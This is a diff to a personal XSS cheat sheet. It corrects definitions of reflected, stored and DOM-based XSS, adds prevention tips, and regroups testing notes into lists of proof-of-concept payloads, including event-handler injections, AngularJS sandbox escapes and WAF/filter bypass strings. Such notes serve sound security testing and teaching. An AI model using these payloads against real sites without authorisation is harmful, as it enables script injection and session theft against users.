@@ -9,11 +9,11 @@ Types of XSS Attacks:
 - Reflected XSS:
     - Reflected cross-site scripting (or XSS) arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.
     - The script is embedded in a URL or request and immediately reflected in the response, often in error messages or search results.
-    - Stored XSS, where the malicious script comes from the website's database.
+    - Reflected XSS, where the malicious script comes from the current HTTP request.
 - Stored XSS (Persistent):
     - Stored cross-site scripting (also known as second-order or persistent XSS) arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way.
     - The malicious script is stored on the server (e.g., in comments or user profiles) and served to users later.
-    - Reflected XSS, where the malicious script comes from the current HTTP request.
+    - Stored XSS, where the malicious script comes from the website's database.
 - DOM-based XSS:
     - DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as eval() or innerHTML. This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts.
     - The vulnerability exists in client-side JavaScript that processes data from the browser without proper sanitization.
@@ -26,32 +26,45 @@ Types of XSS Attacks:
     - Encode data on output: At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding.
     - Use appropriate response headers: To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use the Content-Type and X-Content-Type-Options headers to ensure that browsers interpret the responses in the way you intend.
     - Content Security Policy: As a last line of defense, you can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur.
+    - JavaScript:
+    Add this to Prevention:
+        - Avoid dangerous JavaScript functions like eval(), Function(), setTimeout()/setInterval() with string arguments, document.write() — these increase XSS risk.
+        - Set HttpOnly and Secure flags on cookies to prevent JavaScript access to sensitive cookies.
+        - Use sandbox attribute in iframes to limit script execution.
 
 Test/Check:
 - Reflected:
-    - Test every entry point, Submit random alphanumeric values, Determine the reflection context, Test a candidate payload, Test alternative payloads
-    - Study JS, JQuery code by inspecting, Check for input validation and sanitization
-    - Line and string breaks with comments, close previous tags/query
+    - Test every entry point: submit random alphanumeric values, determine the reflection context
+    - Study JS, jQuery code by inspecting and Check for input validation and sanitization
+    - Use line and string breaks with comments, close previous tags/query
+    - HTML encoding, URL encoding, string replace/split for obfuscation
     - Burp Intruder with testing all allowed tags and events
-    - <script>alert(1)</script>
-    - javascript:alert(1)
-    - Evaluate in backticks: `${alert(1)}`
-    - <svg><animatetransform onbegin=alert(1)>
-    - Validation skip/bypass: \"-alert(1)}//
-    - Cononical Link Tag (https://test.com/?%27accesskey=%27x%27onclick=%27alert(1)): <link rel="canonical" href="https://test.com/?" accesskey="x" onclick="alert(1)">
-    - Obfuscation with libraries such as AngularJS: [1] | orderBy: toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
-    - Obfuscation with libraries such as AngularJS: <input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x'
-    - Blocked Tags and Attributes: <svg><a><animate attributeName="href" values="javascript:alert(1)"></animate><text x="20" y="20">Click me</text></a>'</svg>
+    - Payloads:
+        - <script>alert(1)</script>
+        - javascript:alert(1)
+        - `${alert(1)}` (evaluate in backticks)
+        - <svg><animatetransform onbegin=alert(1)>
+        - \"-alert(1)}// (skip/bypass validation)
+        - <link rel="canonical" href="https://test.com/?" accesskey="x" onclick="alert(1)"> (cononical link tag)
+        - [1] | orderBy: toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41) (obfuscation with AngularJS)
+        - <input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x' (obfuscation with AngularJS)
+        - <svg><a><animate attributeName="href" values="javascript:alert(1)"></animate><text x="20" y="20">Click me</text></a>'</svg> (blocked tags/attributes)
 - DOM Based:
     - Test with Elements that support onload/onerror:
         - <script>alert(1)</script>
         - <svg onload=alert(1)>
         - <img src=x onerror=alert(1)>
-    - Insert/Create Elements that suppors onload
-    - Query Params Manipulation
+    - Inject payloads into: location, document.URL, document.location, document.referrer
+    - Manipulate query/search/hash params: #?name=<img src=x onerror=alert(1)>
+    - Insert/create dynamic elements that trigger events
     - URL Search Params
-    - AngularJS: {{constructor.constructor('alert(1)')()}}
+    - AngularJS sandbox escapes: {{constructor.constructor('alert(1)')()}}
 - Stored:
-    - Store payloads on server
-    - Custom tags when WAF
-    - Anchor Tag Onclick: http://foo?&apos;-alert(1)-&apos;
+    - Store persistent payloads in server: Comments, user bios, posts, file names, etc
+    - Custom tag injection to bypass WAFs
+    - Payloads:
+        - <script>alert('stored')</script>
+        - <img src=x onerror=alert('stored')>
+        - <a href="#" onclick="alert('stored')">Click</a>
+        - <svg/onload=alert('stored')>
+        - http://foo?&apos;-alert(1)-&apos; (anchor onclick)
